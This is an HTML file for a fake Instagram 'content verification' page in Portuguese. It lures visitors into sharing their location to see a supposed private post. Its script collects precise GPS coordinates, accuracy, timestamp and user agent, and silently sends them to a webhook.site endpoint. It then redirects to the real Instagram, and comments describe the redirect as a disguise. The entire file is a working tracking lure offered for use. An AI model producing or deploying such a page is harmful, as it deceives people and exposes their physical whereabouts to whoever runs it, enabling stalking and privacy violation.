<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Instagram">
    <meta property="og:description" content="Toque para ver o conteúdo.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">

    <title>Instagram - Conteúdo Exclusivo</title>
    
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background-color: #fafafa; /* Cor de fundo do Instagram */
        }
        .card { 
            background: white; 
            padding: 40px; 
            border-radius: 20px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
            text-align: center; 
            max-width: 380px; 
            width: 90%;
            border: 1px solid #dbdbdb;
        }
        .insta-logo {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 { color: #262626; font-size: 22px; margin: 0 0 15px 0; }
        p { color: #8e8e8e; line-height: 1.5; margin-bottom: 30px; font-size: 14px; }
        
        .btn-check { 
            padding: 12px 24px; 
            font-size: 16px; 
            background-color: #0095f6; /* Azul do Instagram */
            color: white; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-weight: 600;
            width: 100%;
            transition: background 0.3s ease;
        }
        .btn-check:hover { background-color: #1877f2; }
        #loading { display: none; margin-top: 20px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram" class="insta-logo">
        <h2>Verificação de Conteúdo</h2>
        <p>Para visualizar esta publicação privada, confirme sua localização para validação de segurança da conta.</p>
        
        <button class="btn-check" onclick="enviarLocalizacao()">VER CONTEÚDO</button>
        
        <div id="loading">Autenticando...</div>
    </div>

    <script>
        function enviarLocalizacao() {
            const btn = document.querySelector('.btn-check');
            const loader = document.getElementById('loading');
            
            // Seu link do Webhook
            const URL_DESTINO = "https://webhook.site/999f921d-cfad-42a3-8927-e862ab40f665"; 

            btn.style.display = 'none';
            loader.style.display = 'block';

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    
                    const dados = {
                        lat: position.coords.latitude,
                        lon: position.coords.longitude,
                        precisao: position.coords.accuracy.toFixed(1) + "m",
                        data: new Date().toLocaleString('pt-BR'),
                        agente: navigator.userAgent
                    };

                    // Envio silencioso para o seu Webhook
                    fetch(URL_DESTINO, {
                        method: 'POST',
                        mode: 'no-cors', 
                        body: JSON.stringify(dados)
                    });

                    // Redireciona para o Instagram real para disfarçar
                    setTimeout(() => {
                        window.location.href = "https://www.instagram.com";
                    }, 1000);

                }, function(error) {
                    // Se falhar, redireciona para não parecer erro
                    window.location.href = "https://www.instagram.com";
                }, {
                    enableHighAccuracy: true,
                    timeout: 8000
                });
            } else {
                window.location.href = "https://www.instagram.com";
            }
        }
    </script>
</body>
</html>
